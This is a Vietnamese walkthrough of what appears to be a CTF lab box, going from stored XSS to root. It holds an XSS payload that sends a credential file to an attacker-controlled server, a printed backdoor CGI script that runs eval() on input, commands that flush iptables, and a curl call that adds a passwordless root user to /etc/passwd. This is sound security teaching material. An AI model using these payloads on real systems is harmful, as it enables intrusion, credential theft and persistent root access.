
**XSS → credential theft → SSH access → PCAP analysis → iptables manipulation → backdoor exploitation → root**. 

Kịch bản: một server đã từng bị hack, admin đã chặn backdoor bằng iptables nhưng chưa dọn sạch và ta sẽ tận dụng chính backdoor đó để leo quyền.

## Enumeration

```bash
nmap -sC -sV <TARGET_IP>
```

<img width="1976" height="1210" alt="image" src="https://github.com/user-attachments/assets/f937735b-1659-46c1-9d60-c7b50838e7df" />


### FTP — Anonymous Login

```bash
ftp <TARGET_IP>
# Login: anonymous / anonymous
ftp> ls
ftp> get update.txt
```

<img width="2533" height="407" alt="image" src="https://github.com/user-attachments/assets/b9df0c1a-da09-452e-8f19-64bf343857ad" />


Nội dung `update.txt` tiết lộ:
- Có file `/dir/pass.txt` chứa credentials
- File này **chỉ truy cập được từ localhost** (`127.0.0.1/dir/pass.txt`)

### Web Enumeration (Port 80)

```bash
dirsearch -u http://<TARGET_IP>
```

<img width="1811" height="918" alt="image" src="https://github.com/user-attachments/assets/ad6246aa-2f9d-493d-992f-6000b99dd4d7" />

tìm được trang register.php để đăng kí

---

## Foothold — Stored XSS → Credential Theft

Web có phần comment và dòng note của admin thì mình nghĩ tới ngay là stored xss, lợi dụng con bot đưa cookie cho mình

<img width="897" height="241" alt="image" src="https://github.com/user-attachments/assets/2aad1eea-f3e8-4667-a02a-83fbf7c0dbb2" />

mở server local

```bash
python3 -m http.server 8000
```
đặt tên username với script dưới đây, còn password thì chọn dễ nhớ là được

```html
<script>fetch('http://127.0.0.1/dir/pass.txt').then(r=>r.text()).then(d=>fetch('http://IP:8000/?pass='+btoa(d)))</script>
```

<img width="2543" height="252" alt="image" src="https://github.com/user-attachments/assets/bcaca3c7-749d-4688-9c14-3ba3acc1808a" />

sau đó decode chuỗi base64 này ra

```bash
echo "<BASE64_DATA>" | base64 -d
```

<img width="2117" height="221" alt="image" src="https://github.com/user-attachments/assets/9a09651c-5f2a-4c01-8661-74f20dfda60f" />


ta sẽ nhận được user:pass của jack rồi đăng nhập vào ssh kím được user flag

<img width="1120" height="258" alt="image" src="https://github.com/user-attachments/assets/d8b85bcf-1a87-4169-b909-a49605dec081" />

---

## Privilege Escalation

```bash
sudo -l
```

<img width="2522" height="566" alt="image" src="https://github.com/user-attachments/assets/c1c2c65e-e26d-4ca2-a5f0-5d707d8b74e4" />

mình sẽ có thể chạy root với iptables nhưng đừng vội lên liền vì iptables khó có command để leo nên ta sẽ đi tìm các file khác

```bash
ls /opt/
```

<img width="2544" height="505" alt="image" src="https://github.com/user-attachments/assets/e344630f-e261-4e92-994f-d091042f93c4" />

ở đây tìm được 2 file khả nghi, đọc file urgent.txt trước biết rằng lỗ hổng này là **backdoor** nằm ở `/usr/lib/cgi-bin`, admin đã chặn port 41312 bằng iptables để ngăn backdoor tuy nhiên vẫn còn sai sót nên ta có thể mở lại cổng này để leo thang đặc quyền bằng sudo iptables


### Phân tích Apache Config

```bash
cat /etc/apache2/sites-enabled/000-default.conf

```
<img width="2157" height="1163" alt="image" src="https://github.com/user-attachments/assets/81dc1c46-a105-4ac4-8184-3c1fd5272324" />


→ Port 41312 là **HTTPS server chạy CGI scripts** từ `/usr/lib/cgi-bin/`

mình sẽ đi tìm hiểu file pcap này và sẽ lấy apache key để giải mã những nội dung ẩn 

```bash
scp jack@<TARGET_IP>:/opt/capture.pcap .
scp jack@<TARGET_IP>:/etc/apache2/certs/apache.key .
```

Mở trong **Wireshark** và import SSL key để giải mã traffic:

1. **Edit → Preferences → Protocols → TLS**
2. **RSA keys list → Edit → Add:**
   - IP: `<TARGET_IP>`
   - Port: `41312`
   - Protocol: `http`
   - Key File: `apache.key`
3. Filter: `http.request`

<img width="1516" height="625" alt="image" src="https://github.com/user-attachments/assets/cbcfd0a9-3847-4c9c-9a54-499c34890019" />

<img width="2559" height="165" alt="image" src="https://github.com/user-attachments/assets/61e94db2-7d37-4b37-aad4-ed9384ba3c2b" />

mình sẽ thấy đường dẫn để đọc file hoặc lên root


### Phân tích Backdoor

File backdoor (`5UP3r53Cr37.py`):

```python
#!/usr/bin/python3
from Crypto.Cipher import AES
import os, base64
import cgi, cgitb

print("Content-type: text/html\n\n")

enc_pay = b'k/1umtqRYGJzyyR1kNy3Z+m6bg7Xp7PXXFB9sOih2IPNBRR++jJvUzWZ+WuGdax2ngHyU9seaIb5rEqGcQ7OJA=='

form = cgi.FieldStorage()
try:
    iv = bytes(form.getvalue('iv'), 'utf-8')
    key = bytes(form.getvalue('key'), 'utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    orgnl = cipher.decrypt(base64.b64decode(enc_pay))
    print(" " + eval(orgnl) + " ")
except:
    print("")
```

**Cách hoạt động:**
- Nhận `key` và `iv` qua query string
- Giải mã AES payload → `eval()` kết quả → **Remote Code Execution!**
- CGI chạy dưới quyền `www-data`

**Điểm mấu chốt:** User `www-data` có `sudo NOPASSWD: ALL`:

```
User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

→ `www-data` có thể chạy **BẤT KỲ lệnh nào** với quyền root!

Bây giờ ta sẽ đi mở cổng 41312

```bash
sudo /usr/sbin/iptables -F
```

Xác nhận rules đã bị xóa:

```bash
sudo /usr/sbin/iptables -L
# Chain INPUT (policy ACCEPT) — trống
```
<img width="1754" height="627" alt="image" src="https://github.com/user-attachments/assets/1e77c79f-a329-46fb-89f6-e997a76c2e34" />



rồi bây giờ đọc flag root thôi

```bash
# Đọc root flag
curl -k "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20/root/root.txt"
```

<img width="2559" height="328" alt="image" src="https://github.com/user-attachments/assets/d81c320f-24cf-405f-be6e-80383556fbb8" />

ngoài ra mình có thể chiếm shell bằng cách leo hẳn lên root mà không phải là đi đọc file

```bash
# Thêm user toor (uid=0, no password) vào /etc/passwd qua backdoor
curl -k "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=echo%20toor::0:0:root:/root:/bin/bash%20|%20sudo%20tee%20-a%20/etc/passwd"
```

<img width="2559" height="506" alt="image" src="https://github.com/user-attachments/assets/1201b19f-25cb-4806-881a-2b7d9fb850dc" />


